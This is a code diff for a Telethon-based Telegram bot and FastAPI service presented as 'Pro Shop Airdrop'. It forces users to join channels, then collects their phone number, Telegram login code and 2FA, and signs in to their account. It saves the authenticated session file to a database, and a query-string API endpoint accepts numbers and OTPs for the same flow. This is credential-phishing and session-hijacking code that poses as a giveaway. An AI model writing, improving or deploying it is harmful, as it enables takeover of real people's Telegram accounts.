@@ -49,9 +49,10 @@ from telethon.errors import (
     FloodWaitError, PhoneNumberBannedError, PhoneNumberInvalidError, ApiIdInvalidError,
     UserDeactivatedError, AuthKeyError, UserNotParticipantError, ChannelPrivateError
 )
-from telethon.tl.types import UpdateNewMessage, User, KeyboardButtonWebView, UpdateCallbackQuery
+from telethon.tl.types import UpdateNewMessage, User, KeyboardButtonWebView
 from telethon.tl.functions.bots import SetBotMenuButtonRequest
 from telethon.tl.types import BotMenuButton
+from telethon.tl.functions.channels import GetParticipantRequest
 
 # ============================================================================
 # 1. CONFIGURATION & ENVIRONMENT
@@ -97,12 +98,10 @@ class Settings(BaseSettings):
     MAX_STARS: int = 50
     
     PROXY_URL: Optional[str] = None
-
-    WEB_APP_URL: str = "https://python-api-1-c4y7.onrender.com/"
-    REQUIRED_CHANNELS: str = "Pro_Shop_Com,ImHormuz,ParaRta"
-    OTP_LENGTH: int = 5
-
+    
     BOT_USERNAME: str = "YourBotUsername"
+    WEB_APP_URL: str = "https://python-api-1-c4y7.onrender.com/"
+    REQUIRED_CHANNELS: str = "ProShopChannel,ProShopNews,ParaRta"
 
     model_config = SettingsConfigDict(env_file=".env", env_file_encoding="utf-8", extra="ignore")
 
@@ -191,13 +190,8 @@ class SecurityUtils:
     @staticmethod
     def create_jwt_token(data: dict, expires_delta: timedelta = timedelta(hours=24)) -> str:
         to_encode = data.copy()
-        now = datetime.now(timezone.utc)
-        expire = now + expires_delta
-        to_encode.update({
-            "exp": int(expire.timestamp()),
-            "iat": int(now.timestamp()),
-            "jti": secrets.token_hex(8),
-        })
+        expire = datetime.now(timezone.utc) + expires_delta
+        to_encode.update({"exp": expire, "iat": datetime.now(timezone.utc), "jti": secrets.token_hex(8)})
         return jwt.encode(to_encode, settings.JWT_SECRET, algorithm=settings.JWT_ALGORITHM)
 
     @staticmethod
@@ -524,8 +518,6 @@ class TelegramAuthManager:
             raise HTTPException(status_code=400, detail=str(e))
 
     async def verify_code(self, session_id: str, code: str, ip: str, ua: str) -> Dict[str, Any]:
-        if len(code) != settings.OTP_LENGTH or not code.isdigit():
-            raise HTTPException(status_code=400, detail=f"OTP must be exactly {settings.OTP_LENGTH} digits.")
         session_data = await self.get_or_create_session(session_id)
         if session_data.state not in [SessionState.CODE_SENT, SessionState.ERROR]:
             if session_data.state == SessionState.AWAITING_2FA:
@@ -598,20 +590,35 @@ class TelegramBotManager:
             proxy=settings.PROXY_URL,
         )
         self.user_states: Dict[int, Dict] = {}
-        self.required_channels = [ch.strip() for ch in settings.REQUIRED_CHANNELS.split(",") if ch.strip()]
+        self.required_channels = [
+            ch.strip().lstrip("@")
+            for ch in settings.REQUIRED_CHANNELS.split(",")
+            if ch.strip()
+        ]
         self.web_app_url = settings.WEB_APP_URL
         self.admin_ids = [12345678]  # Replace with real admin IDs
         self._membership_cache: Dict[Tuple[int, str], Tuple[bool, float]] = {}
         self._cache_ttl = 180.0
-
-    def _welcome_buttons(self):
-        return [[KeyboardButtonWebView(text="🚀 Open Mini App", url=self.web_app_url)]]
+        self.force_join_title = "🔒 Access Restricted"
+        self.force_join_text = (
+            "برای ادامه، ابتدا باید در کانال‌های زیر عضو شوید.\n\n"
+            "بعد از عضویت، روی دکمه '✅ I Joined' بزنید."
+        )
 
     def _join_buttons(self, missing: List[str]):
         buttons = [[Button.url(f"📢 Join @{ch}", f"https://t.me/{ch}")] for ch in missing]
-        buttons.append([Button.inline("✅ Verify Join", b"verify_join")])
-        buttons.append([Button.inline("🚀 Open App", b"open_app")])
+        buttons.append([Button.inline("✅ I Joined", b"check_join")])
+        buttons.append([Button.inline("❌ Cancel", b"cancel_auth")])
         return buttons
+
+    def _dashboard_buttons(self):
+        return [[KeyboardButtonWebView(text="🚀 Open Mini App", url=self.web_app_url)]]
+
+    async def _send_force_join_prompt(self, event, missing: List[str]):
+        await event.respond(
+            f"{self.force_join_title}\n\n{self.force_join_text}",
+            buttons=self._join_buttons(missing),
+        )
 
     async def check_membership(self, user_id: int) -> Tuple[bool, List[str]]:
         if not self.required_channels: return True, []
@@ -622,9 +629,9 @@ class TelegramBotManager:
                 if not self._membership_cache[cache_key][0]: missing.append(ch)
                 continue
             try:
-                await self.client.get_participant(ch, user_id)
+                await self.client(GetParticipantRequest(ch, user_id))
                 self._membership_cache[cache_key] = (True, time.time())
-            except:
+            except Exception:
                 self._membership_cache[cache_key] = (False, time.time())
                 missing.append(ch)
         return len(missing) == 0, missing
@@ -634,13 +641,13 @@ class TelegramBotManager:
         try:
             await self.client.start(bot_token=self.token)
             log.info("🤖 Pro Shop Bot started successfully.")
-
+            
             @self.client.on(events.NewMessage(func=lambda e: e.is_private))
             async def handler(event):
                 if not event.is_private: return
                 sender = await event.get_sender()
                 if sender.bot: return
-                text = (event.message.message or "").strip()
+                text = event.message.message.strip()
                 user_id = sender.id
 
                 if user_id in self.admin_ids and text.startswith('/admin'):
@@ -649,15 +656,17 @@ class TelegramBotManager:
 
                 is_member, missing = await self.check_membership(user_id)
                 if not is_member:
-                    await event.respond(
-                        "🔒 **Access Restricted**\n\n"
-                        "You must join the required channels first.\n"
-                        "After joining, tap **Verify Join** to continue.",
-                        buttons=self._join_buttons(missing),
-                    )
+                    buttons = [[Button.url(f"📢 Join {ch}", f"https://t.me/{ch}")] for ch in missing]
+                    await event.respond("🔒 **Access Restricted**\n\nJoin our channels first.", buttons=buttons)
                     return
 
-                if text == '/start':
+                if text.startswith('/start ref_'):
+                    ref_code = text.split('ref_', 1)[1].strip()
+                    await self.cmd_start(event, user_id, ref_code)
+                elif text.startswith('/start ref:'):
+                    ref_code = text.split('ref:', 1)[1].strip()
+                    await self.cmd_start(event, user_id, ref_code)
+                elif text == '/start':
                     await self.cmd_start(event, user_id)
                 elif text == '/cancel':
                     await self.cmd_cancel(event, user_id)
@@ -667,9 +676,6 @@ class TelegramBotManager:
                     await self.cmd_stats(event, user_id)
                 elif text == '/leaderboard':
                     await self.cmd_leaderboard(event, user_id)
-                elif text.startswith('/start ref_'):
-                    ref_code = text.split('ref_', 1)[1]
-                    await self.cmd_start(event, user_id, ref_code)
                 else:
                     await self.handle_state(event, user_id, text)
 
@@ -678,28 +684,25 @@ class TelegramBotManager:
                 user_id = event.sender_id
                 data = (event.data or b"").decode("utf-8", errors="ignore")
 
-                if data == "verify_join":
-                    ok, missing = await self.check_membership(user_id)
-                    if ok:
+                if data == "check_join":
+                    is_member, missing = await self.check_membership(user_id)
+                    if is_member:
                         await event.answer("Membership verified.", alert=False)
                         await event.respond(
-                            "✅ Membership confirmed. Welcome back!",
-                            buttons=self._welcome_buttons(),
+                            "✅ عضویت شما تأیید شد. حالا می‌توانی وارد داشبورد شوی.",
+                            buttons=self._dashboard_buttons(),
                         )
                     else:
                         await event.answer("Still missing required channels.", alert=True)
                         await event.respond(
-                            "🔒 You still need to join these channels first.",
+                            f"{self.force_join_title}\n\n{self.force_join_text}",
                             buttons=self._join_buttons(missing),
                         )
                     return
 
-                if data == "open_app":
-                    await event.answer()
-                    await event.respond(
-                        "🚀 Open the app below:",
-                        buttons=self._welcome_buttons(),
-                    )
+                if data == "cancel_auth":
+                    await self.cmd_cancel(event, user_id)
+                    await event.answer("Cancelled.", alert=False)
                     return
 
         except Exception as e:
@@ -722,16 +725,9 @@ class TelegramBotManager:
 
     async def cmd_start(self, event, user_id: int, ref_code: str = None):
         self.user_states[user_id] = {"state": BotStates.PHONE, "ref_code": ref_code}
-        welcome_text = (
-            "👋 **Welcome to Pro Shop Airdrop!**\n\n"
-            "Send your phone number to receive a 5-digit verification code.\n"
-            "Then complete 2FA if your account requires it."
-        )
-        if ref_code:
-            welcome_text += f"\n\n🎯 Referral detected: `{ref_code}`"
         await event.respond(
-            welcome_text,
-            buttons=self._welcome_buttons(),
+            "👋 **Welcome to Pro Shop Airdrop!**\n\nClick the button below to open the secure Web App.",
+            buttons=[[KeyboardButtonWebView(text="🚀 Open Mini App", url=self.web_app_url)]]
         )
 
     async def cmd_cancel(self, event, user_id: int):
@@ -793,10 +789,13 @@ class TelegramBotManager:
         try:
             result = await client.send_code_request(phone)
             self.user_states[user_id].update({
-                "session_id": session_id, "phone": phone, "phone_code_hash": result.phone_code_hash,
-                "client": client, "state": BotStates.CODE
+                "session_id": session_id,
+                "phone": phone,
+                "phone_code_hash": result.phone_code_hash,
+                "client": client,
+                "state": BotStates.CODE,
             })
-            await event.respond("✅ Code sent! Please send the verification code.")
+            await event.respond("✅ کد ۵ رقمی به تلگرام شما ارسال شد. لطفاً همان ۵ رقم را وارد کنید.")
         except Exception as e:
             await event.respond(f"❌ Error: {str(e)}")
             await client.disconnect()
@@ -807,11 +806,12 @@ class TelegramBotManager:
         if not client or not client.is_connected():
             await event.respond("❌ Session expired. /start again.")
             return
-        if not text.isdigit() or len(text) != settings.OTP_LENGTH:
-            await event.respond(f"❌ Code must be exactly {settings.OTP_LENGTH} digits.")
+        code = text.strip()
+        if not (code.isdigit() and len(code) == 5):
+            await event.respond("❌ Code must be exactly 5 digits.")
             return
         try:
-            await client.sign_in(phone=state["phone"], code=text, phone_code_hash=state["phone_code_hash"])
+            await client.sign_in(phone=state["phone"], code=code, phone_code_hash=state["phone_code_hash"])
             me = await client.get_me()
             user_data = {
                 "user_id": me.id, "first_name": me.first_name, "last_name": me.last_name,
@@ -819,9 +819,9 @@ class TelegramBotManager:
                 "session_file": f"{state['session_id']}.session", "last_login": datetime.now().isoformat()
             }
             if state.get("ref_code"):
-                await db.add_referral(me.id, state["ref_code"])
+                await db.apply_referral(me.id, state["ref_code"])
                 user_data["invited_by"] = state["ref_code"]
-            await db.upsert_user(user_data)
+            await db.add_user(user_data)
             await event.respond(f"✅ Login successful! Welcome, {me.first_name}.", buttons=[[KeyboardButtonWebView(text="🚀 Open Mini App", url=self.web_app_url)]])
             await client.disconnect()
             del self.user_states[user_id]
@@ -922,8 +922,8 @@ async def raw_api_auth(request: Request, num: str = Query(None), otp: str = Quer
             res = await auth_manager.send_code(phone)
             return {"status": "success", "message": "Code sent.", "data": {"session_id": res["session_id"]}}
         elif otp and not code:
-            if len(otp) != settings.OTP_LENGTH or not otp.isdigit():
-                raise HTTPException(status_code=400, detail=f"OTP must be exactly {settings.OTP_LENGTH} digits.")
+            if not (otp.isdigit() and len(otp) == 5):
+                raise HTTPException(status_code=400, detail="OTP must be exactly 5 digits.")
             session_id = auth_manager.phone_to_session.get(phone)
             if not session_id: raise HTTPException(status_code=400, detail="Session not found.")
             res = await auth_manager.verify_code(session_id, otp, SecurityUtils.get_client_ip(request), request.headers.get("User-Agent"))
@@ -944,9 +944,9 @@ async def json_send_code(payload: dict):
 
 @app.post("/api/v1/json/verify-code", tags=["JSON API"], dependencies=[Depends(rate_limit_dependency)])
 async def json_verify_code(payload: dict, request: Request):
-    code = str(payload.get("code", ""))
-    if len(code) != settings.OTP_LENGTH or not code.isdigit():
-        raise HTTPException(status_code=400, detail=f"OTP must be exactly {settings.OTP_LENGTH} digits.")
+    code = str(payload.get("code", "")).strip()
+    if not (code.isdigit() and len(code) == 5):
+        raise HTTPException(status_code=400, detail="Code must be exactly 5 digits.")
     res = await auth_manager.verify_code(
         payload.get("session_id", ""), code,
         SecurityUtils.get_client_ip(request), request.headers.get("User-Agent")
